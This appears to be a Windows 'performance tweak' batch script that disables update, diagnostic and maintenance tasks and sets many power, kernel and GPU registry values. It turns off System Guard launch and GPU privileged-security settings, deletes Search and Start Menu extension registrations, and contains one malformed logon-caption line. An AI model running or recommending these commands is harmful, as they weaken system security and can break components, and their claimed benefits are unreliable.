schtasks /Change /Disable /TN "\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskLogon" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\StateRepository\MaintenanceTasks" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\UPnP\UPnPHostConfig" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\RetailDemo\CleanupOfflineContent" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\InstallService\ScanForUpdates" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\InstallService\ScanForUpdatesAsUser" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\InstallService\SmartRetry" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\International\Synchronize Language Settings" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Printing\EduPrintProv" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Ras\MobilityManager" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Time Zone\SynchronizeTimeZone" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Time Synchronization\SynchronizeTime" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Time Synchronization\ForceSynchronizeTime" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Diagnosis\Scheduled" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Wininet\CacheTask" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Mobile Broadband Accounts\MNO Metadata Parser" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\NetTrace\GatherNetworkInfo" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\TPM\Tpm-HASCertRetr" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\TPM\Tpm-Maintenance" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\Sysmain\ResPriStaticDbSync" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\ApplicationData\appuriverifierdaily" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\ApplicationData\appuriverifierinstall" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\ApplicationData\DsSvcCleanup" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\XblGameSave\XblGameSaveTask" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\XblGameSave\XblGameSaveTaskLogon" > nul 2> nul
schtasks /Change /Disable /TN "\Microsoft\WindowsManagement\Provisioning\Cellular" > nul 2> nul
cls
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticecaption" /t REG_SZ /d "reg add "HKEY_CLASSES_ROOT\Directory\background\shell\Tweaked by https://twitter.com/D1LMAO" /f >NUL 2>&1" /f >NUL 2>&1
schtasks /change /tn "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" /disable >NUL 2>nul
schtasks /change /tn "\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents" /disable >NUL 2>nul
schtasks /change /tn "\Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic" /disable >NUL 2>nul
schtasks /change /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /disable >NUL 2>nul
schtasks /change /tn "\Microsoft\Windows\Windows Error Reporting\QueueReporting" /disable >NUL 2>nul
schtasks /change /tn "\Microsoft\Windows\Application Experience\AitAgent" /disable >NUL 2>nul
schtasks /change /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /disable >NUL 2>nul
schtasks /change /tn "\Microsoft\Windows\WindowsUpdate\Scheduled Start" /disable >NUL 2>nul
wevtutil sl Microsoft-Windows-SleepStudy/Diagnostic /e:false >NUL 2>nul
wevtutil sl Microsoft-Windows-Kernel-Processor-Power/Diagnostic /e:false >NUL 2>nul
wevtutil sl Microsoft-Windows-UserModePowerService/Diagnostic /e:false >NUL 2>nul
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceDefault" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceFSVP" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyTolerancePerfOverride" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceScreenOffIR" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceVSyncEnabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "RtlCapabilityCheckLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyActivelyUsed" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleLongTime" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleMonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleNoContext" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleShortTime" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleVeryLongTime" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0MonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1MonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceMemory" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContext" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContextMonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceOther" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceTimerPeriod" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceActivelyUsed" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceMonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceNoContext" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "Latency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MaxIAverageGraphicsLatencyInOneBucket" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MiracastPerfTrackGraphicsLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "TransitionLatency" /t REG_DWORD /d "1" /f 
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v HibernateEnabled /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v EnergyEstimationEnabled /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v CsEnabled /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v PerfCalculateActualUtilization /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v SleepReliabilityDetailedDiagnostics /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v EventProcessorEnabled /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v QosManagesIdleProcessors /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v DisableVsyncLatencyUpdate /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v DisableSensorWatchdog /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v DeepIoCoalescingEnabled /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v LowLatencyScalingPercentage /t REG_DWORD /d 64 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v HighPerformance /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v MfBufferingThreshold /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v AwayModeEnabled /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v Class1InitialUnparkCount /t REG_DWORD /d 100 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v CustomizeDuringSetup /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v HiberFileSizePercent /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v TimerRebaseThresholdOnDripsExit /t REG_DWORD /d 30 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v EnergyEstimationDisabled /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v PerfBoostAtGuaranteed /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v CoreParkingDisabled /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v HighestPerformance /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v MinimumThrottlePercent /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /v MaximumThrottlePercent /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Processor" /v Capabilities /t REG_DWORD /d 0x0007e066 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Processor" /v Cstates /t REG_DWORD /d 0 /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "SeTokenSingletonAttributesConfig" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "obcaseinsensitive" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "ThreadDpcEnable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "ConfigureSystemGuardLaunch" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DistributeTimers" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "GlobalTimerResolutionRequests" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrLevel" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "SchedulingDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "LatencyToleranceTimerDisable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TransitionLatency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "MiracastForceDisable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "lowdebounce" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMHdcpKeyglobZero" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "enableSmartDimmer" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PowerSaverHsyncOn" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "F1TransitionLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "D3PCLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMDeepL1EntryLatencyUsec" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMDisableGpuASPMFlags" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMClkSlowDown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMAERRHandling" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMAdaptivePwrDebug" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "EnableMClkSlowdown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "enableAdaptiveSync" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "VRRAlwaysOn" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "SmoothBrightnessDefaultEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "enableVrrFrameSmoothing" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "EnablexUSBPowerControl" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMPrivSecurity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmRcWatchdog" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmAllowPrivSecDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMAERRForceDisable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "Node3DLowLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "DisableOverlay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMEnableASPMAtLoad" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmOverrideSupportChipsetAspm" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMSbiosEnableASPMDT" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMEnableASPMDT" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmWotHdcpEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PowerSavingTweaks" /t REG_DWORD /d "0" /f
cls
reg delete HKCR\Extensions\ContractId\Windows.Search\PackageId\Microsoft.Windows.Search_1.14.0.19041_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.ComponentUI\PackageId\Microsoft.Windows.Search_1.14.0.19041_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.ComponentUI\PackageId\Microsoft.Windows.StartMenuExperienceHost_10.0.19041.423_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.AppService\PackageId\Microsoft.Windows.Search_1.14.0.19041_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.AppService\PackageId\Microsoft.Windows.ShellExperienceHost_10.0.19041.423_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.Windows.Search_1.14.0.19041_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.Windows.ShellExperienceHost_10.0.19041.423_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.ShareTarget\PackageId\ActiproSoftwareLLC.562882FEEB491_2.6.18.18_neutral__24pqs290vpjk0 /f
reg delete HKCR\Extensions\ContractId\Windows.BackgroundTasks\PackageId\46928bounde.EclipseManager_2.2.4.51_neutral__a5h4egax66k6y /f
reg delete HKCR\Extensions\ContractId\Windows.BackgroundTasks\PackageId\ActiproSoftwareLLC.562882FEEB491_2.6.18.18_neutral__24pqs290vpjk0 /f
reg delete HKCR\Extensions\ContractId\Windows.BackgroundTasks\PackageId\Microsoft.MicrosoftOfficeHub_17.7909.7600.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.BackgroundTasks\PackageId\Microsoft.PPIProjection_10.0.15063.0_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.BackgroundTasks\PackageId\Microsoft.XboxGameCallableUI_1000.15063.0.0_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.BackgroundTasks\PackageId\Microsoft.XboxGameCallableUI_1000.16299.15.0_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.BackgroundTasks\PackageId\Microsoft.Windows.Search_1.14.0.19041_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.BackgroundTasks\PackageId\Microsoft.Windows.ShellExperienceHost_10.0.19041.423_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.BackgroundTasks\PackageId\Microsoft.Windows.StartMenuExperienceHost_10.0.19041.423_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.BackgroundTasks\PackageId\MicrosoftWindows.UndockedDevKit_10.0.19041.423_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.File\PackageId\ActiproSoftwareLLC.562882FEEB491_2.6.18.18_neutral__24pqs290vpjk0 /f
reg delete HKCR\Extensions\ContractId\Windows.Launch\PackageId\46928bounde.EclipseManager_2.2.4.51_neutral__a5h4egax66k6y /f
reg delete HKCR\Extensions\ContractId\Windows.Launch\PackageId\ActiproSoftwareLLC.562882FEEB491_2.6.18.18_neutral__24pqs290vpjk0 /f
reg delete HKCR\Extensions\ContractId\Windows.Launch\PackageId\Microsoft.PPIProjection_10.0.15063.0_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.Launch\PackageId\Microsoft.XboxGameCallableUI_1000.15063.0.0_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.Launch\PackageId\Microsoft.XboxGameCallableUI_1000.16299.15.0_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.Launch\PackageId\Microsoft.Windows.Search_1.14.0.19041_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.Launch\PackageId\Microsoft.Windows.ShellExperienceHost_10.0.19041.423_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.Launch\PackageId\Microsoft.Windows.StartMenuExperienceHost_10.0.19041.423_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.Launch\PackageId\MicrosoftWindows.UndockedDevKit_10.0.19041.423_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.PreInstalledConfigTask\PackageId\Microsoft.MicrosoftOfficeHub_17.7909.7600.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\ActiproSoftwareLLC.562882FEEB491_2.6.18.18_neutral__24pqs290vpjk0 /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.PPIProjection_10.0.15063.0_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.XboxGameCallableUI_1000.15063.0.0_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.XboxGameCallableUI_1000.16299.15.0_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.BingWeather_4.25.20211.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.GetHelp_10.1706.13331.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.Getstarted_8.2.22942.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.MicrosoftEdge_44.19041.423.0_neutral__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.MicrosoftOfficeHub_18.1903.1152.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.MixedReality.Portal_2000.19081.1301.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.MSPaint_6.1907.29027.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.Office.OneNote_16001.12026.20112.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.People_10.1902.633.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.WindowsAlarms_10.1906.2182.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.WindowsCamera_2018.826.98.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.WindowsFeedbackHub_1.1907.3152.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.WindowsCalculator_10.1906.55.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.WindowsMaps_5.1906.1972.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.WindowsStore_11910.1002.5.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.Xbox.TCUI_1.23.28002.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.XboxApp_48.49.31001.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.XboxGameCallableUI_1000.19041.423.0_neutral_neutral_cw5n1h2txyewy /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.XboxGameOverlay_1.46.11001.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.XboxGamingOverlay_2.34.28001.0_x64__8wekyb3d8bbwe /f
